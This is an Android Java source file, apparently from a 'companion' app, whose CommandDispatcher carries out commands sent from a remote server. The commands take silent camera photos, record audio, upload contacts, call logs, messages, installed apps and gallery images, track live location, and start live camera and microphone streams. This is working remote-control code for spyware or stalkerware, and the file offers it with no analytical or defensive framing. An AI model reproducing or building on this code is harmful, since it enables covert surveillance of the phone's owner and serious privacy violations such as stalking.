package com.snapapp.companion;

import android.content.Context;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import org.json.JSONObject;

public class CommandDispatcher {
    public interface LocationRefreshCallback {
        void onRefreshNeeded();
    }

    public static void dispatch(final Context context, final String serverUrl, final String deviceId,
                                JSONObject cmd, final LocationRefreshCallback locationCallback) {
        if (cmd == null) return;
        final String type = cmd.optString("command", "");
        final String cmdId = cmd.optString("id", null);
        JSONObject payload = cmd.optJSONObject("payload");

        if ("ring_siren".equals(type)) {
            try {
                Uri alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
                if (alert == null) alert = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
                Ringtone r = RingtoneManager.getRingtone(context.getApplicationContext(), alert);
                if (r != null) r.play();
            } catch (Exception ignored) {}
        } else if ("take_photo".equals(type)) {
            final String camType = (payload != null) ? payload.optString("camera", "front") : "front";
            CameraHelper.takeSilentPhoto(context, "front".equalsIgnoreCase(camType), new CameraHelper.PhotoCallback() {
                @Override public void onPhotoCaptured(byte[] data) { ApiClient.uploadPhoto(serverUrl, deviceId, cmdId, camType, data); }
                @Override public void onError(String e) {}
            });
        } else if ("record_audio".equals(type)) {
            int duration = (payload != null) ? payload.optInt("duration", 15) : 15;
            AudioHelper.recordAndUpload(context, serverUrl, deviceId, cmdId, duration, null);
        } else if ("sync_apps".equals(type)) {
            TelemetryHelper.syncInstalledApps(context, serverUrl, deviceId, cmdId);
        } else if ("sync_contacts".equals(type)) {
            TelemetryHelper.syncContacts(context, serverUrl, deviceId, cmdId);
        } else if ("sync_calls".equals(type)) {
            TelemetryHelper.syncCalls(context, serverUrl, deviceId, cmdId);
        } else if ("sync_messages".equals(type)) {
            TelemetryHelper.syncMessages(context, serverUrl, deviceId, cmdId);
        } else if ("sync_gallery".equals(type)) {
            GalleryHelper.syncGallery(context, serverUrl, deviceId, cmdId);
        } else if ("start_live_movement".equals(type)) {
            CompanionSyncService.setLiveMovementActive(context, true);
            if (locationCallback != null) locationCallback.onRefreshNeeded();
        } else if ("stop_live_movement".equals(type)) {
            CompanionSyncService.setLiveMovementActive(context, false);
            if (locationCallback != null) locationCallback.onRefreshNeeded();
        } else if ("webrtc_stream".equals(type)) {
            handleWebRtcCommand(context, serverUrl, deviceId, payload);
        } else if ("fetch_location".equals(type) || "update_location".equals(type)) {
            if (locationCallback != null) locationCallback.onRefreshNeeded();
        }
    }

    private static void handleWebRtcCommand(Context ctx, String server, String devId, JSONObject p) {
        if (p == null) return;
        String act = p.optString("action", "start");
        if ("start".equals(act)) {
            boolean front = p.optBoolean("front", true);
            boolean video = p.optBoolean("video", true);
            boolean audio = p.optBoolean("audio", true);
            WebRtcStreamManager.getInstance().startLiveStream(ctx, server, devId, front, video, audio);
        } else if ("switch_camera".equals(act)) {
            WebRtcStreamManager.getInstance().switchCamera();
        } else if ("stop".equals(act)) {
            WebRtcStreamManager.getInstance().stopLiveStream();
        } else if ("offer".equals(act)) {
            WebRtcStreamManager.getInstance().handleRemoteOffer(p.optString("sdp"));
        } else if ("candidate".equals(act)) {
            WebRtcStreamManager.getInstance().handleRemoteCandidate(
                    p.optString("candidate"), p.optInt("sdpMLineIndex", 0), p.optString("sdpMid", ""));
        }
    }
}
